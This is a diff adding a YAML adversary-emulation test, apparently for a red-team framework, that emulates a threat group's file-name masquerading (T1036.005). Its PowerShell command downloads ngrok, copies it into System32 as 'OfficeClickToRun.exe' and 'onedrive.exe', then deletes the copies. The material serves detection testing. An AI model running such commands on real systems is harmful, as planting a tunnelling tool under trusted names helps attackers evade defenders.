@@ -1,0 +1,26 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaaf
+  name: "[SHADOW-TWELVE] Ngrok specific name masquerading"
+  description: "Shadow маскирует имена файлов, скриптов, приложений под продукты таких компаний, как Intel, Microsoft, VMware и т. п."
+  tactic: defense-evasion
+  technique:
+    attack_id: T1036.005
+    name: "Masquerading: Match Legitimate Name or Location"
+  platforms:
+    windows:
+      psh:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+          $zip="$env:TEMP\ngrok.zip"; $dir="$env:TEMP"; 
+          if(-not (Test-Path $dir)){ New-Item $dir -Type Directory } ; 
+          try { 
+            Invoke-WebRequest "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -OutFile $zip -ErrorAction Stop; 
+            Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; 
+            Copy-Item "$dir\ngrok.exe" "$env:SystemRoot\System32\Microsoft\OfficeClickToRun.exe" -Force; 
+            Copy-Item "$dir\ngrok.exe" "C:\Windows\System32\onedrive.exe" -Force; 
+            Remove-Item $zip -Force 
+          } catch { } ; 
+          Start-Sleep -Seconds 10; 
+          if(Test-Path "$env:SystemRoot\System32\Microsoft\OfficeClickToRun.exe") { Remove-Item "$env:SystemRoot\System32\Microsoft\OfficeClickToRun.exe" -Force };
+          if(Test-Path "C:\Windows\System32\onedrive.exe") { Remove-Item "C:\Windows\System32\onedrive.exe" -Force }
+
+        timeout: 120
